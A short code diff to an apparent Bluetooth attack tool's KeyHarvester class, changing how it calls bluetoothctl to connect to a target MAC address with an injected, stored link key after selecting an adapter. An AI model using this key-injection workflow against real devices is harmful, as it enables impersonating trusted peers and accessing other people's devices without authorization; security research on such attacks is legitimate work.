@@ -274,11 +274,13 @@ class KeyHarvester:
             error("Link key injection failed")
             return False
 
-        # Attempt connection via bluetoothctl
-        info(f"Connecting to {target_mac} via bluetoothctl...")
-        result = run_cmd(
-            ["bluetoothctl", "connect", target_mac],
-            timeout=15,
+        # Attempt connection via bluetoothctl (select adapter first)
+        info(f"Connecting to {target_mac} via bluetoothctl ({self._hci})...")
+        import subprocess
+        bt_commands = f"select {self._hci}\nconnect {target_mac}\nquit\n"
+        result = subprocess.run(
+            ["bluetoothctl"], input=bt_commands,
+            capture_output=True, text=True, timeout=15, errors="replace",
         )
         if result.returncode == 0 and "Connection successful" in result.stdout:
             success(f"Connected to {target_mac} using stored key")
